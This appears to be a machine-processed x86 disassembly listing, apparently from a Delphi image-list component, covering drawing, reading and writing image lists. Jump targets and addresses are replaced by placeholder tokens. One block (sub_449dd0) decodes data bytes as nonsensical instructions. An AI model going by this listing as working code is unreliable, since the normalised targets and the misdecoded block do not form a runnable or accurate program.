mov eax [ ebx + 0x54 ]
call sub_4299b0
call sub_425714
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_424fb8
mov eax edi
call sub_425714
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_424fb8
mov eax edi
call sub_425714
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_42a7e0
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_448c68
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
movzx ebx [ eax + 0x40 ]
push ebx
movzx ebx [ eax + 0x43 ]
push ebx
movzx ebx [ ebp + 0x8 ]
push ebx
call sub_448c90
pop ebx
pop ebp
retn 0xc
sub_448c90
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_448634
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_448cdc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_418448
mov eax [ ebp - 0x4 ]
call sub_449978
xor eax eax
push ebp
push sub_448e75
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_448e58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_448e3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_42a7e0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e42
mov eax [ ebp - 0x10 ]
call sub_404650
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4299b0
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_42535c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_425714
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4299b0
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_42535c
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_425714
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4488ac
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_448e84
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_448770
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_448cdc
sub_448ea4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebx
call sub_4487d4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_419e40
mov eax ebx
call sub_448a28
movzx eax [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
movzx eax [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
movzx edx [ esi + 0x40 ]
mov eax ebx
call sub_449094
movzx eax [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_448770
mov edx eax
mov eax ebx
call sub_44870c
mov eax ebx
call sub_448634
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_448770
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44863c
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_448770
push eax
call ImageList_GetBkColor
call sub_4484a4
mov edx eax
mov eax ebx
call sub_448a34
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_448e84
jmp r-xdata
sub_448f68
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419f24
pop esi
pop ebx
retn
movzx eax [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
movzx eax [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
movzx edx [ esi + 0x40 ]
mov eax ebx
call sub_449094
movzx eax [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_448a28
mov eax esi
call sub_448770
mov edx eax
mov eax ebx
call sub_44870c
mov eax ebx
call sub_448634
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_448770
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44863c
jmp r-xdata
mov eax esi
call sub_448770
push eax
call ImageList_GetBkColor
call sub_4484a4
mov edx eax
mov eax ebx
call sub_448a34
mov edx esi
mov eax ebx
call sub_448e84
pop esi
pop ebx
retn
sub_44901c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_449088
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44908f
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4490bc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_419898
mov si 0xffff
call sub_40484c
inc ebp
dec edi
jne r-xdata
sub_44910c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41978c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_419898
cmp ebp eax
jne r-xdata
sub_449164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_409954
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4491a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_448978
mov ebx eax
mov eax edi
call sub_448978
cmp ebx eax
je r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_448978
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_449284
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449267
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_449164
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44926e
mov eax [ ebp - 0xc ]
call sub_404650
retn
mov eax edi
call sub_448978
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_449298
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_448978
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4491a8
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4492f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_420354
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_449298
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44934c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41b940
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41b940
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4495d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41b714
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41b734
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4495b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4293dc
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a7e0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_418448
mov eax [ ebp - 0x4 ]
call sub_449978
xor eax eax
push ebp
push sub_449596
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44959d
mov eax [ ebp - 0xc ]
call sub_404650
mov eax [ ebp - 0x14 ]
call sub_404650
mov eax [ ebp - 0x4 ]
call sub_44997c
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_418470
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4299b0
push eax
mov eax [ ebp - 0xc ]
call sub_4299b0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_425228
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_418470
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_4299b0
push eax
mov eax [ ebp - 0x14 ]
call sub_4299b0
lea edx [ ebp - 0x30 ]
pop ecx
call sub_425228
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4488ac
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4495e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ae0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_449640
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448744
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449647
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub eax 0xffffffec
sub_449647
mov eax [ ebp - 0x4 ]
call sub_448634
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_449777
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b734
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41becc
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b734
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_404650
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41b734
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ae0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44975a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41b734
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_448744
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub eax 0xffffffec
movzx eax [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41b734
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_4497a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_4487d4
mov eax edi
call sub_41b714
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
movzx ebx [ esp ]
and bl 0xff
movzx eax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41b734
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_44934c
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_4495e0
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_449834
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_420ae0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44992e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40e3a4
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_448770
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_448770
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449935
mov eax [ ebp - 0x4 ]
call sub_404650
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
jmp r-xdata
sub_44999c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
mov edx esi
call sub_44910c
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_449dd0
mov esp 0xe40044ab
stosd [ edi ]
inc esp
add [ 0x73754354 ] cl
je r-xdata
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + ecx ] bh
inc edx
add [ eax ] bh
or [ edx ] al
jo r-xdata
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
in al dx
popfd
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
inc edx
add ah dl
or [ edx ] al
hlt
inc edx
add al dl
or [ edx ] al
movsb [ edi ] [ esi ]
or [ edx ] al
aam 0x8
inc edx
add ah dh
pop es
inc edx
add [ eax - 0x23ffbdf8 ] cl
or [ edx ] al
add [ ebp - 0x5aebffbc ] ah
inc esp
add [ eax ] ch
movsd [ edi ] [ esi ]
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
popfd
inc esp
add [ edx + ebx * 4 + 0x30044 ] bh
or [ ecx + 0x63 ] al
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42092c
test bl bl
jle r-xdata
mov edx esi
call sub_44a2f4
inc esp
add [ 0xffffffffa5500044 ] bh
inc esp
add [ ebp + 0x44 ] ah
add [ eax - 0x5b ] bh
inc esp
add [ ebp - 0x5a5fffbc ] cl
inc esp
add [ ebp - 0x5a37ffbc ] dh
inc esp
add ah cl
movsd [ edi ] [ esi ]
inc esp
add al dl
movsd [ edi ] [ esi ]
inc esp
add ah dl
movsd [ edi ] [ esi ]
inc esp
add al bl
movsd [ edi ] [ esi ]
inc esp
add ah bl
movsd [ edi ] [ esi ]
inc esp
add al ah
movsd [ edi ] [ esi ]
inc esp
add ah ah
movsd [ edi ] [ esi ]
inc esp
add al ch
movsd [ edi ] [ esi ]
inc esp
add ah ch
movsd [ edi ] [ esi ]
inc esp
add al dh
movsd [ edi ] [ esi ]
inc esp
add ah dh
movsd [ edi ] [ esi ]
inc esp
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x35e85653
stosd [ edi ]
sti
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
fmul [ eax ]
inc edx
add [ eax ] al
movsd [ edi ] [ esi ]
inc esp
add [ 0xffffffffa5280044 ] dl
dec esp
imul esi [ ebx + 0x74 ] 0x9e5c0000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
sahf
inc esp
add [ eax ] bl
add [ eax ] al
add [ eax - 0x67ffbe7e ] ch
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_449ee0
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42092c
test bl bl
jle r-xdata
mov edx esi
call sub_44a2f4
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_449f50
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42043c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_449ff8
sub_449f84
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_449f14
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41978c
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_419914
sub_449fcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_405974
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_405584
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_449ff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44a2f4
mov edx ebx
mov eax esi
call sub_44a2d4
sub_44a020
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_449ff8
sub_44a04c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_447d04
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_40484c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4209c0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_44d380
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a0a4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_447d2c
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_40484c
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_4209dc
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_44d380
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a0fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41ffc4
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebx + 0x30 ] eax
